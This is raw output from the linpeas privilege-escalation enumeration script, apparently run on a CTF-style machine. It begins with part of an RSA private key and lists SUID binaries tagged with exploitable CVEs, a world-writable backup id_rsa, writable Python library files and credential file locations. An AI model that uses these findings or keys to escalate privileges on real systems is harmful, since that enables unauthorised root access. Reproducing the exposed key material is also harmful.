Rm8PSPLK7CJP1iGluXQjJIPNaXZE9oNeooKpBJCbie1On5ceuCNuHFAtrOAF4RS1
beol+yDOks/tzhyICvREcQKBgCHIiRClu/ZPTYZoMKHmkeRleJxnGGQnn4K2hY1K
KZEByFOQE8nmuwbXE8HUa/cq9J936c8Kl/hvbMf6kDSyhJozOeJd5aqbqT7Kb6zA
ELkU10cUUB4qGGo5JF7OHeiSAwmcBtdm/qfywIWibUpJaf3JeEQGUn3INMPtV8j4
4gQbAoGBAKuXPITKuO7SsRfXcwB3MO3iCTLdW7BYnYF1SzVbPBonmcsxlQinvoRg
2faWmSFAUK6cIys9za3pzOw3FP8W9Q5SGsA9KriSYj6/h7ei9GeJAr3mxlbGnkZN
ZFqUVe2Jvxq++O6Ub41zUtWINbR5Fxf+kTlJIIwqc6IuzZq+QWXy
-----END RSA PRIVATE KEY-----



-rw-rw-r-- 1 jack jack 391 Jan 10  2020 /home/jack/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF8FH0X1Xkbaye/VdprG/dUdsVnZVlHAbJT5qHqSiYF5oCV2vxI0rXHTC795eMuOtadVpg4RTZhSsfOf924Hda+bzHIDRPzH9ZtXaixZpU5p+Q9K9ilXg51Ct1GhLc8Q5dGdL4Kc5MCA9ajb7F8fVd6V0XD1eJiumtO6CbAJxgO4FkHevOZYDyw9aMuOzrHM0rbpFBBuj3NrHB8R2Nndqf0meAknubSu0X28p4JF87VXyx3+3WW73oqqfgVlRNdAUQZ8Bi6kbpve+lHCqYjrLZWMrkzGUyYR3A/yjGYpHhdGq9IrXyblvLPxlS7VF8HxSD+kor1VVuT1AVZutXgTcX jack@jack

Port 22
PermitRootLogin yes
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes

══╣ Possible private SSH keys were found!
/home/jack/.config/lxc/client.key
/home/jack/.ssh/id_rsa

══╣ Some certificates were found (out limited):
/home/jack/.config/lxc/client.crt
20307PSTORAGE_CERTSBIN

./linpeas.sh: 2779: ./linpeas.sh: gpg-connect-agent: not found
══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config
AuthorizedKeysFile	.ssh/authorized_keys
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jan  8  2020 /etc/pam.d
-rw-r--r-- 1 root root 2133 Jan 31  2019 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.1


/tmp/tmux-1000
╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Jan  8  2020 /usr/share/keyrings
drwxr-xr-x 2 root root 4096 Jan  8  2020 /var/lib/apt/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 12255 Feb 26  2019 /etc/apt/trusted.gpg
-rw------- 1 jack jack 0 Jan 18 14:53 /home/jack/.gnupg/pubring.gpg
-rw------- 1 jack jack 40 Jan 18 14:53 /home/jack/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 12335 May 18  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 18  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 2294 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring-removed.gpg
-rw-r--r-- 1 root root 2253 Nov  5  2017 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Nov  5  2017 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1227 May 18  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2256 Feb 26  2016 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 12335 Feb 26  2019 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg

drwx------ 2 jack jack 4096 Jan 18 14:53 /home/jack/.gnupg


╔══════════╣ Analyzing FTP Files (limit 70)


-rw-r--r-- 1 root root 69 Oct 24  2019 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Oct 24  2019 /usr/share/php7.0-common/common/ftp.ini






╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 root adm 417698 Jan 18 15:16 /var/log/apache2/access.log

-rw-r----- 1 root adm 32020 Jan 18 14:49 /var/log/apache2/error.log
-rw-rw---- 1 mysql adm 5271 Jan  9  2020 /var/log/mysql/error.log

╔══════════╣ Analyzing Windows Files (limit 70)






















lrwxrwxrwx 1 root root 22 Jan  9  2020 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
lrwxrwxrwx 1 root root 24 Jan  9  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 83 Jan  9  2020 /var/lib/dpkg/alternatives/my.cnf



























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc
-rw-r--r-- 1 jack jack 3771 Jan  8  2020 /home/jack/.bashrc





-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
-rw-r--r-- 1 jack jack 655 Jan  8  2020 /home/jack/.profile






                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-sr-x 1 root root 97K Jan 29  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 419K Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 39K Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 15K Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 134K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 23K Jan 15  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 27K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 139K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 40K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-sr-x 1 root root 97K Jan 29  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 61K May 16  2017 /usr/bin/chage
-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 23K May 16  2017 /usr/bin/expiry
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 351K Jan 31  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen  --->  GNU_Screen_4.5.0
-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root tty 27K May 16  2018 /usr/bin/wall
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/pam_extrausers_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Files with capabilities (limited to 50):
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root root 4096 Jan 10  2020 .
drwxr-xr-x 23 root root 4096 Jan  8  2020 ..
drwxr-xr-x  2 root root 4096 Jan 10  2020 statuscheck

╔══════════╣ Unexpected in root
/initrd.img
/vmlinuz

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 24
drwxr-xr-x  2 root root 4096 Jan  8  2020 .
drwxr-xr-x 96 root root 4096 Jan 13  2020 ..
-rw-r--r--  1 root root  825 Jan 29  2019 apps-bin-path.sh
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--  1 root root 1557 Apr 14  2016 Z97-byobu.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/jack/reminder.txt
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/home/jack
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 110390 Jan  9  2020 /var/log/apt/term.log
-rw-r----- 1 root adm 31 Feb 26  2019 /var/log/dmesg
-rw-r----- 1 root adm 417698 Jan 18 15:16 /var/log/apache2/access.log
-rw-r----- 1 root adm 32020 Jan 18 14:49 /var/log/apache2/error.log
-rw-r----- 1 root adm 0 Jan  9  2020 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 31 Feb 26  2019 /var/log/fsck/checkroot
-rw-r----- 1 root adm 31 Feb 26  2019 /var/log/fsck/checkfs

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/opt/statuscheck/output.log
/var/log/wtmp
/var/log/lastlog
/var/log/auth.log
/var/log/apache2/access.log
/var/log/syslog

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation

╔══════════╣ Files inside /home/jack (limit 20)
total 44
drwxr-xr-x 6 jack jack 4096 Jan 18 14:53 .
drwxr-xr-x 3 root root 4096 Jan  8  2020 ..
lrwxrwxrwx 1 jack jack    9 Jan 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack  220 Jan  8  2020 .bash_logout
-rw-r--r-- 1 jack jack 3771 Jan  8  2020 .bashrc
drwx------ 2 jack jack 4096 Jan  9  2020 .cache
drwxr-x--- 3 jack jack 4096 Jan 18 14:53 .config
drwx------ 2 jack jack 4096 Jan 18 14:53 .gnupg
-rw-r--r-- 1 jack jack  655 Jan  8  2020 .profile
-rw-r--r-- 1 root root  140 Jan 10  2020 reminder.txt
drwx------ 2 jack jack 4096 Jan 10  2020 .ssh
-rw-rw-r-- 1 jack jack   33 Jan 10  2020 user.txt

╔══════════╣ Files inside others home (limit 20)

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 190591 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/.config.old
-rw-r--r-- 1 root root 0 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 11358 Jan  9  2020 /usr/share/info/dir.old
-rwxr-xr-x 1 root root 226 Apr 14  2016 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 665 Apr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 35792 May  8  2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 128 Jan  8  2020 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 9070 Jan 16  2019 /lib/modules/4.4.0-142-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9038 Jan 16  2019 /lib/modules/4.4.0-142-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 610 Jan  8  2020 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Jan  8  2020 /etc/xml/xml-core.xml.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root     root     4.0K Jan  9  2020 .
drwxr-xr-x 14 root     root     4.0K Jan  9  2020 ..
drwxrwsr-x  5 www-data www-data 4.0K Jan 10  2020 html

/var/www/html:
total 224K
drwxrwsr-x  5 www-data www-data 4.0K Jan 10  2020 .
drwxr-xr-x  3 root     root     4.0K Jan  9  2020 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-rw-r-- 1 www-data www-data 235 Jan 10  2020 /var/www/html/.htaccess
-rw-r--r-- 1 root root 0 Jan 18 14:49 /run/network/.ifstate.lock
-rw-r--r-- 1 jack jack 220 Jan  8  2020 /home/jack/.bash_logout
-rw------- 1 root root 0 Feb 26  2019 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 1391 Jan  8  2020 /etc/apparmor.d/cache/.features

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxrwxr-x 1 jack jack 777018 Nov  8 12:58 /tmp/linpeas.sh
-rw-r--r-- 1 root root 11 Jan  8  2020 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 713 Jan  8  2020 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 129487 Jan  8  2020 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 129 Jan  8  2020 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 437 Jan  8  2020 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 207 Jan  9  2020 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 552673 Jan  9  2020 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 43 Jan  8  2020 /var/backups/dpkg.arch.1.gz
-rw-r--r-- 1 root root 202 Jan  8  2020 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root root 9931 Jan  9  2020 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 40960 Jan  9  2020 /var/backups/alternatives.tar.0
-rwxrwxrwx 1 root root 1675 Jan 10  2020 /var/backups/id_rsa

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/jack
/run/lock
/run/user/1000
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/tmux-1000
#)You_can_write_even_more_files_inside_last_directory

/var/backups/id_rsa
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2duuid-5aa0286cx2deea1x2d44e2x2db918x2d7041334f10a1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-xvda5.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@eth0.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/run-user-1000.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.seeded.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/tasks
/var/lib/php/sessions
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group jack:
/tmp/linpeas.sh
  Group adm:
/var/log/mysql/error.log
  Group family:
/usr/lib/python2.7/_threading_local.py
/usr/lib/python2.7/plistlib.pyc
/usr/lib/python2.7/stringprep.py
/usr/lib/python2.7/ihooks.pyc
/usr/lib/python2.7/weakref.py
#)You_can_write_even_more_files_inside_last_directory

/etc/python2.7/sitecustomize.py

╔══════════╣ Searching passwords in history files

╔══════════╣ Searching passwords in config PHP files
		$pwd    = trim( wp_unslash( $_POST['pwd'] ) );

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/home/jack/.config/lxc/client.key
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/locale-langpack/en_AU/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/locale-langpack/en_GB/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password
/var/www/html/wp-admin/js/password-strength-meter.js
/var/www/html/wp-admin/js/password-strength-meter.min.js

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
2019-02-26 23:58:11 configure base-passwd:amd64 3.5.39 3.5.39
2019-02-26 23:58:11 install base-passwd:amd64 <none> 3.5.39
2019-02-26 23:58:11 status half-configured base-passwd:amd64 3.5.39
2019-02-26 23:58:11 status half-installed base-passwd:amd64 3.5.39
2019-02-26 23:58:11 status installed base-passwd:amd64 3.5.39
2019-02-26 23:58:11 status unpacked base-passwd:amd64 3.5.39
2019-02-26 23:58:13 status half-configured base-passwd:amd64 3.5.39
2019-02-26 23:58:13 status half-installed base-passwd:amd64 3.5.39
2019-02-26 23:58:13 status unpacked base-passwd:amd64 3.5.39
2019-02-26 23:58:13 upgrade base-passwd:amd64 3.5.39 3.5.39
2019-02-26 23:58:19 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
2019-02-26 23:58:19 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:58:19 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2019-02-26 23:58:22 configure base-passwd:amd64 3.5.39 <none>
2019-02-26 23:58:22 status half-configured base-passwd:amd64 3.5.39
2019-02-26 23:58:22 status installed base-passwd:amd64 3.5.39
2019-02-26 23:58:22 status unpacked base-passwd:amd64 3.5.39
2019-02-26 23:58:28 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
2019-02-26 23:58:28 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
